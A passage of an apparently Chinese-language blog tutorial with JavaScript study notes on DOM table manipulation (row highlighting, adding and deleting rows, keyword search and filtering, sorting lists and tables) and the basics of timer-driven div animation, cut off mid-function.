alert(oTab.tBodies[0].rows[1].cells[1].innerHTML);   </span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">姓名：&lt;input id=&quot;name&quot; type=&quot;text&quot; /&gt;</span><br><span class="line">年龄：&lt;input id=&quot;age&quot; type=&quot;text&quot; /&gt;</span><br><span class="line">&lt;input id=&quot;btn1&quot; type=&quot;button&quot; value=&quot;添加&quot; /&gt;</span><br><span class="line">&lt;input id=&quot;btn1&quot; type=&quot;button&quot; value=&quot;搜索&quot; /&gt;</span><br><span class="line">&lt;table id=&quot;tab1&quot; border=&quot;1&quot; width=&quot;500&quot;&gt;</span><br><span class="line">	&lt;thead&gt;</span><br><span class="line">    	&lt;td&gt;ID&lt;/td&gt;</span><br><span class="line">    	&lt;td&gt;姓名&lt;/td&gt;</span><br><span class="line">    	&lt;td&gt;年龄&lt;/td&gt;</span><br><span class="line">        &lt;td&gt;操作&lt;/td&gt;</span><br><span class="line">    &lt;/thead&gt;</span><br><span class="line">    &lt;tbody&gt;</span><br><span class="line">    	&lt;tr&gt;</span><br><span class="line">        	&lt;td&gt;1&lt;/td&gt;</span><br><span class="line">        	&lt;td&gt;Blue&lt;/td&gt;</span><br><span class="line">        	&lt;td&gt;27&lt;/td&gt;</span><br><span class="line">        	&lt;td&gt;&lt;/td&gt;</span><br><span class="line">        &lt;/tr&gt;</span><br><span class="line">    	&lt;tr&gt;</span><br><span class="line">        	&lt;td&gt;2&lt;/td&gt;</span><br><span class="line">        	&lt;td&gt;张三&lt;/td&gt;</span><br><span class="line">        	&lt;td&gt;23&lt;/td&gt;</span><br><span class="line">        	&lt;td&gt;&lt;/td&gt;</span><br><span class="line">        &lt;/tr&gt;</span><br><span class="line">    	&lt;tr&gt;</span><br><span class="line">        	&lt;td&gt;3&lt;/td&gt;</span><br><span class="line">        	&lt;td&gt;李四&lt;/td&gt;</span><br><span class="line">        	&lt;td&gt;28&lt;/td&gt;</span><br><span class="line">        	&lt;td&gt;&lt;/td&gt;</span><br><span class="line">        &lt;/tr&gt;</span><br><span class="line">    	&lt;tr&gt;</span><br><span class="line">        	&lt;td&gt;4&lt;/td&gt;</span><br><span class="line">        	&lt;td&gt;王五&lt;/td&gt;</span><br><span class="line">        	&lt;td&gt;25&lt;/td&gt;</span><br><span class="line">        	&lt;td&gt;&lt;/td&gt;</span><br><span class="line">        &lt;/tr&gt;</span><br><span class="line">    	&lt;tr&gt;</span><br><span class="line">        	&lt;td&gt;5&lt;/td&gt;</span><br><span class="line">        	&lt;td&gt;张伟&lt;/td&gt;</span><br><span class="line">        	&lt;td&gt;24&lt;/td&gt;</span><br><span class="line">        	&lt;td&gt;&lt;/td&gt;</span><br><span class="line">        &lt;/tr&gt;</span><br><span class="line">    &lt;/tbody&gt;</span><br><span class="line">&lt;/table&gt;</span><br></pre></td></tr></table></figure>
<h3><span id="隔行变色">隔行变色</span></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">function ()</span><br><span class="line">&#123;</span><br><span class="line">	var oTab=document.getElementById(&apos;tab1&apos;);</span><br><span class="line">	var oldColor=&apos;&apos;;  //定义变量保存原来的颜色</span><br><span class="line">	</span><br><span class="line">	for(var i=0;i&lt;oTab.tBodies[0].rows.length;i++)</span><br><span class="line">	&#123;</span><br><span class="line">		oTab.tBodies[0].rows[i].onmouseover=function ()</span><br><span class="line">		&#123;</span><br><span class="line">			oldColor=this.style.background;</span><br><span class="line">			this.style.background=&apos;green&apos;;</span><br><span class="line">		&#125;;</span><br><span class="line">		oTab.tBodies[0].rows[i].onmouseout=function ()</span><br><span class="line">		&#123;</span><br><span class="line">			this.style.background=oldColor;   </span><br><span class="line">		&#125;;</span><br><span class="line">		</span><br><span class="line">		if(i%2)</span><br><span class="line">		&#123;</span><br><span class="line">			oTab.tBodies[0].rows[i].style.background=&apos;&apos;;</span><br><span class="line">		&#125;</span><br><span class="line">		else</span><br><span class="line">		&#123;</span><br><span class="line">			oTab.tBodies[0].rows[i].style.background=&apos;#CCC&apos;;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h3><span id="添加-删除一行">添加、删除一行</span></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">function ()</span><br><span class="line">&#123;</span><br><span class="line">	var oTab=document.getElementById(&apos;tab1&apos;);</span><br><span class="line">	</span><br><span class="line">	var oBtn=document.getElementById(&apos;btn1&apos;);</span><br><span class="line">	var oName=document.getElementById(&apos;name&apos;);</span><br><span class="line">	var oAge=document.getElementById(&apos;age&apos;);</span><br><span class="line">	var id=oTab.tBodies[0].rows.length+1;</span><br><span class="line">	</span><br><span class="line">	oBtn.onclick=function ()</span><br><span class="line">	&#123;</span><br><span class="line">		var oTr=document.createElement(&apos;tr&apos;);</span><br><span class="line">		</span><br><span class="line">		var oTd=document.createElement(&apos;td&apos;);</span><br><span class="line">		oTd.innerHTML=id++;	//?</span><br><span class="line">		oTr.appendChild(oTd);</span><br><span class="line">		</span><br><span class="line">		var oTd=document.createElement(&apos;td&apos;);</span><br><span class="line">		oTd.innerHTML=oName.value;</span><br><span class="line">		oTr.appendChild(oTd);</span><br><span class="line">		</span><br><span class="line">		var oTd=document.createElement(&apos;td&apos;);</span><br><span class="line">		oTd.innerHTML=oAge.value;</span><br><span class="line">		oTr.appendChild(oTd);</span><br><span class="line">		</span><br><span class="line">		var oTd=document.createElement(&apos;td&apos;);</span><br><span class="line">		oTd.innerHTML=&apos;&lt;a href=&quot;javascript:;&quot;&gt;删除&lt;/a&gt;&apos;;</span><br><span class="line">		oTr.appendChild(oTd);</span><br><span class="line">		</span><br><span class="line">		oTd.getElementsByTagName(&apos;a&apos;)[0].onclick=function ()</span><br><span class="line">		&#123;</span><br><span class="line">			oTab.tBodies[0].removeChild(this.parentNode.parentNode); //从tBodies里面删除</span><br><span class="line">		&#125;;</span><br><span class="line">		</span><br><span class="line">		oTab.tBodies[0].appendChild(oTr);</span><br><span class="line">	&#125;;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h2><span id="搜索">搜索</span></h2><h3><span id="版本1基础版本字符串比较">版本1：基础版本——字符串比较</span></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">function ()</span><br><span class="line">&#123;</span><br><span class="line">	var oTab=document.getElementById(&apos;tab1&apos;);</span><br><span class="line">	var oTxt=document.getElementById(&apos;name&apos;);</span><br><span class="line">	var oBtn=document.getElementById(&apos;btn1&apos;);</span><br><span class="line">	</span><br><span class="line">	oBtn.onclick=function ()</span><br><span class="line">	&#123;</span><br><span class="line">		for(var i=0;i&lt;oTab.tBodies[0].rows.length;i++)</span><br><span class="line">		&#123;</span><br><span class="line">			if(oTab.tBodies[0].rows[i].cells[1].innerHTML==oTxt.value)</span><br><span class="line">			&#123;</span><br><span class="line">				oTab.tBodies[0].rows[i].style.background=&apos;yellow&apos;;</span><br><span class="line">			&#125;</span><br><span class="line">			else</span><br><span class="line">			&#123;</span><br><span class="line">				oTab.tBodies[0].rows[i].style.background=&apos;&apos;;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h3><span id="版本2忽略大小写大小写转换">版本2：忽略大小写——大小写转换</span></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">function ()</span><br><span class="line">&#123;</span><br><span class="line">	var oTab=document.getElementById(&apos;tab1&apos;);</span><br><span class="line">	var oTxt=document.getElementById(&apos;name&apos;);</span><br><span class="line">	var oBtn=document.getElementById(&apos;btn1&apos;);</span><br><span class="line">	</span><br><span class="line">	oBtn.onclick=function ()</span><br><span class="line">	&#123;</span><br><span class="line">		for(var i=0;i&lt;oTab.tBodies[0].rows.length;i++)</span><br><span class="line">		&#123;</span><br><span class="line">			var sTab=oTab.tBodies[0].rows[i].cells[1].innerHTML;</span><br><span class="line">			var sTxt=oTxt.value;</span><br><span class="line">			if(sTab.toLowerCase()==sTxt.toLowerCase())</span><br><span class="line">			&#123;</span><br><span class="line">				oTab.tBodies[0].rows[i].style.background=&apos;yellow&apos;;</span><br><span class="line">			&#125;</span><br><span class="line">			else</span><br><span class="line">			&#123;</span><br><span class="line">				oTab.tBodies[0].rows[i].style.background=&apos;&apos;;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h3><span id="版本3模糊搜索search的使用">版本3：模糊搜索——search的使用</span></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">var str=&apos;abc&apos;;</span><br><span class="line">str.search((&apos;a&apos;));  //找到并返回，返回数组里的位置，没有找到返回-1</span><br><span class="line"></span><br><span class="line">function ()</span><br><span class="line">&#123;</span><br><span class="line">	var oTab=document.getElementById(&apos;tab1&apos;);</span><br><span class="line">	var oTxt=document.getElementById(&apos;name&apos;);</span><br><span class="line">	var oBtn=document.getElementById(&apos;btn1&apos;);</span><br><span class="line">	</span><br><span class="line">	oBtn.onclick=function ()</span><br><span class="line">	&#123;</span><br><span class="line">		for(var i=0;i&lt;oTab.tBodies[0].rows.length;i++)</span><br><span class="line">		&#123;</span><br><span class="line">			var sTab=oTab.tBodies[0].rows[i].cells[1].innerHTML.toLowerCase();</span><br><span class="line">			var sTxt=oTxt.value.toLowerCase();</span><br><span class="line">			if(sTab.search(sTxt)!=-1)   //</span><br><span class="line">			&#123;</span><br><span class="line">				oTab.tBodies[0].rows[i].style.background=&apos;yellow&apos;;</span><br><span class="line">			&#125;</span><br><span class="line">			else</span><br><span class="line">			&#123;</span><br><span class="line">				oTab.tBodies[0].rows[i].style.background=&apos;&apos;;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h3><span id="版本4多关键词split">版本4：多关键词——split</span></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">var str=&apos;abc 123 ert&apos;;</span><br><span class="line">var arr=str.aplit(&apos; &apos;);</span><br><span class="line"></span><br><span class="line">function ()</span><br><span class="line">&#123;</span><br><span class="line">	var oTab=document.getElementById(&apos;tab1&apos;);</span><br><span class="line">	var oTxt=document.getElementById(&apos;name&apos;);</span><br><span class="line">	var oBtn=document.getElementById(&apos;btn1&apos;);</span><br><span class="line">	</span><br><span class="line">	oBtn.onclick=function ()</span><br><span class="line">	&#123;</span><br><span class="line">		for(var i=0;i&lt;oTab.tBodies[0].rows.length;i++)</span><br><span class="line">		&#123;</span><br><span class="line">			var sTab=oTab.tBodies[0].rows[i].cells[1].innerHTML.toLowerCase();</span><br><span class="line">			var sTxt=oTxt.value.toLowerCase();</span><br><span class="line">			</span><br><span class="line">			var arr=sTxt.split(&apos; &apos;);</span><br><span class="line">			</span><br><span class="line">			oTab.tBodies[0].rows[i].style.background=&apos;&apos;;</span><br><span class="line">			</span><br><span class="line">			for(var j=0;j&lt;arr.length;j++)</span><br><span class="line">			&#123;</span><br><span class="line">				if(sTab.search(arr[j])!=-1)</span><br><span class="line">				&#123;</span><br><span class="line">					oTab.tBodies[0].rows[i].style.background=&apos;yellow&apos;;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h3><span id="高亮显示-筛选">高亮显示、筛选</span></h3><ul>
<li>高亮</li>
<li>筛选<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">function ()  //筛选</span><br><span class="line">&#123;</span><br><span class="line">	var oTab=document.getElementById(&apos;tab1&apos;);</span><br><span class="line">	var oTxt=document.getElementById(&apos;name&apos;);</span><br><span class="line">	var oBtn=document.getElementById(&apos;btn1&apos;);</span><br><span class="line">	</span><br><span class="line">	oBtn.onclick=function ()</span><br><span class="line">	&#123;</span><br><span class="line">		for(var i=0;i&lt;oTab.tBodies[0].rows.length;i++)</span><br><span class="line">		&#123;</span><br><span class="line">			var sTab=oTab.tBodies[0].rows[i].cells[1].innerHTML.toLowerCase();</span><br><span class="line">			var sTxt=oTxt.value.toLowerCase();</span><br><span class="line">			</span><br><span class="line">			var arr=sTxt.split(&apos; &apos;);</span><br><span class="line">			</span><br><span class="line">			oTab.tBodies[0].rows[i].style.display=&apos;none&apos;;    </span><br><span class="line">			</span><br><span class="line">			for(var j=0;j&lt;arr.length;j++)</span><br><span class="line">			&#123;</span><br><span class="line">				if(sTab.search(arr[j])!=-1)</span><br><span class="line">				&#123;</span><br><span class="line">					oTab.tBodies[0].rows[i].style.display=&apos;block&apos;;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h2><span id="排序">排序</span></h2><h3><span id="li排序">li排序</span></h3><ul>
<li><p>从一个div移动另一个div</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">function ()</span><br><span class="line">&#123;</span><br><span class="line">	var oUl1=document.getElementById(&apos;ul1&apos;);</span><br><span class="line">	var oUl2=document.getElementById(&apos;ul2&apos;);</span><br><span class="line">	var oBtn=document.getElementById(&apos;btn1&apos;);</span><br><span class="line">	</span><br><span class="line">	oBtn.onclick=function ()</span><br><span class="line">	&#123;</span><br><span class="line">		var oLi=oUl1.children[0];</span><br><span class="line">		</span><br><span class="line">		//oUl1.removeChild(oLi);</span><br><span class="line">		oUl2.appendChild(oLi);	//1.先把元素从原有父级上删掉	2.添加到新的父级</span><br><span class="line">	&#125;;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">&lt;ul id=&quot;ul1&quot;&gt;</span><br><span class="line">	&lt;li&gt;1&lt;/li&gt;</span><br><span class="line">	&lt;li&gt;2&lt;/li&gt;</span><br><span class="line">	&lt;li&gt;3&lt;/li&gt;</span><br><span class="line">	&lt;li&gt;4&lt;/li&gt;</span><br><span class="line">&lt;/ul&gt;</span><br><span class="line">&lt;input id=&quot;btn1&quot; type=&quot;button&quot; value=&quot;移动&quot; /&gt;</span><br><span class="line">&lt;ul id=&quot;ul2&quot;&gt;</span><br><span class="line">&lt;/ul&gt;</span><br></pre></td></tr></table></figure>
</li>
<li><p>第一个li移动到最后一个</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">window.onload=function ()</span><br><span class="line">&#123;</span><br><span class="line">	var oUl1=document.getElementById(&apos;ul1&apos;);</span><br><span class="line">	var oBtn=document.getElementById(&apos;btn1&apos;);</span><br><span class="line">	</span><br><span class="line">	oBtn.onclick=function ()</span><br><span class="line">	&#123;</span><br><span class="line">		var oLi=oUl1.children[0];</span><br><span class="line">		</span><br><span class="line">		oUl1.appendChild(oLi);</span><br><span class="line">	&#125;;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;input id=&quot;btn1&quot; type=&quot;button&quot; value=&quot;移动&quot; /&gt;</span><br><span class="line">&lt;ul id=&quot;ul1&quot;&gt;</span><br><span class="line">	&lt;li&gt;1&lt;/li&gt;</span><br><span class="line">	&lt;li&gt;2&lt;/li&gt;</span><br><span class="line">	&lt;li&gt;3&lt;/li&gt;</span><br><span class="line">	&lt;li&gt;4&lt;/li&gt;</span><br><span class="line">&lt;/ul&gt;</span><br></pre></td></tr></table></figure>
</li>
<li><p>利用appendChild排序</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">window.onload=function ()</span><br><span class="line">&#123;</span><br><span class="line">	var oUl1=document.getElementById(&apos;ul1&apos;);</span><br><span class="line">	var oBtn=document.getElementById(&apos;btn1&apos;);</span><br><span class="line">	</span><br><span class="line">	oBtn.onclick=function ()</span><br><span class="line">	&#123;</span><br><span class="line">		var aLi=oUl1.getElementsByTagName(&apos;li&apos;);</span><br><span class="line">		</span><br><span class="line">		//aLi.sort();</span><br><span class="line">		var arr=[];</span><br><span class="line">		</span><br><span class="line">		for(var i=0;i&lt;aLi.length;i++)</span><br><span class="line">		&#123;</span><br><span class="line">			arr[i]=aLi[i];</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">		arr.sort(function (li1, li2)&#123;</span><br><span class="line">			var n1=parseInt(li1.innerHTML);</span><br><span class="line">			var n2=parseInt(li2.innerHTML);</span><br><span class="line">			</span><br><span class="line">			return n1-n2;</span><br><span class="line">		&#125;);</span><br><span class="line">		</span><br><span class="line">		//alert(arr[0].innerHTML);</span><br><span class="line">		for(var i=0;i&lt;arr.length;i++)</span><br><span class="line">		&#123;</span><br><span class="line">			alert(&apos;该把&apos;+arr[i].innerHTML+&apos;插入到最后&apos;);</span><br><span class="line">			oUl1.appendChild(arr[i]);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h3><span id="表格排序">表格排序</span></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">window.onload=function ()</span><br><span class="line">&#123;</span><br><span class="line">	var oTab=document.getElementById(&apos;tab1&apos;);</span><br><span class="line">	var oBtn=document.getElementById(&apos;btn1&apos;);</span><br><span class="line">	</span><br><span class="line">	oBtn.onclick=function ()</span><br><span class="line">	&#123;</span><br><span class="line">		var arr=[];</span><br><span class="line">		</span><br><span class="line">		for(var i=0;i&lt;oTab.tBodies[0].rows.length;i++)</span><br><span class="line">		&#123;</span><br><span class="line">			arr[i]=oTab.tBodies[0].rows[i];</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">		arr.sort(function (tr1, tr2)&#123;</span><br><span class="line">			var n1=parseInt(tr1.cells[0].innerHTML);</span><br><span class="line">			var n2=parseInt(tr2.cells[0].innerHTML);</span><br><span class="line">			</span><br><span class="line">			return n1-n2;</span><br><span class="line">		&#125;);</span><br><span class="line">		</span><br><span class="line">		for(var i=0;i&lt;arr.length;i++)</span><br><span class="line">		&#123;</span><br><span class="line">			oTab.tBodies[0].appendChild(arr[i]);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h1><span id="js运动基础">JS运动基础</span></h1><h2><span id="运动基础">运动基础</span></h2><ul>
<li>让Div运动起来</li>
<li>速度——物体运动的快慢</li>
<li>运动中的Bug<br>   不会停止<br>   速度取某些值会无法停止<br>   到达位置后再点击还会运动<br>   重复点击速度加快<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">var timer=null;  </span><br><span class="line"></span><br><span class="line">function startMove()</span><br><span class="line">&#123;</span><br><span class="line">	var oDiv=document.getElementById(&apos;div1&apos;);</span><br><span class="line">	</span><br><span class="line">	clearInterval(timer);   //在开始运动时，关闭已有定时器</span><br><span class="line">	timer=setInterval(function ()&#123;</span><br><span class="line">		var speed=1;   // 定义一个speed变量 控制速度</span><br><span class="line">		</span><br><span class="line">		if(oDiv.offsetLeft&gt;=300)  //把运动和停止隔开(if/else)</span><br><span class="line">		&#123;</span><br><span class="line">			clearInterval(timer);  //满足条件 关闭定时器 停止运动</span><br><span class="line">		&#125;</span><br><span class="line">		else</span><br><span class="line">		&#123;</span><br><span class="line">			oDiv.style.left=oDiv.offsetLeft+speed+&apos;px&apos;;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;, 30);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h2><span id="运动框架及应用">运动框架及应用</span></h2><h3><span id="运动框架实例">运动框架实例</span></h3><h4><span id="分享到-侧边栏">分享到 侧边栏</span></h4><ul>
<li>通过目标点，计算速度值<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">&lt;style&gt;</span><br><span class="line">#div1 &#123;width:150px; height:200px; background:green; position:absolute; left:-150px;&#125;</span><br><span class="line">#div1 span &#123;position:absolute; width:20px; height:60px; line-height:20px; background:blue; right:-20px; top:70px;&#125;</span><br><span class="line">&lt;/style&gt;</span><br><span class="line"></span><br><span class="line">window.onload=function ()</span><br><span class="line">&#123;</span><br><span class="line">	var oDiv=document.getElementById(&apos;div1&apos;);</span><br><span class="line">	</span><br><span class="line">	oDiv.onmouseover=function ()</span><br><span class="line">	&#123;</span><br><span class="line">		startMove(0);</span><br><span class="line">	&#125;;</span><br><span class="line">	oDiv.onmouseout=function ()</span><br><span class="line">	&#123;</span><br><span class="line">		startMove(-150);</span><br><span class="line">	&#125;;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">var timer=null;</span><br><span class="line"></span><br><span class="line">function startMove(iTarget)</span><br><span class="line">&#123;</span><br><span class="line">	var oDiv=document.getElementById(&apos;div1&apos;);</span><br><span class="line">	</span><br><span class="line">	clearInterval(timer);</span><br><span class="line">	timer=setInterval(function ()&#123;</span><br><span class="line">		var speed=0;</span><br><span class="line">		</span><br><span class="line">		if(oDiv.offsetLeft&gt;iTarget)</span><br><span class="line">		&#123;</span><br><span class="line">			speed=-10;</span><br><span class="line">		&#125;</span><br><span class="line">		else</span><br><span class="line">		&#123;</span><br><span class="line">			speed=10;</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">		if(oDiv.offsetLeft==iTarget)</span><br><span class="line">		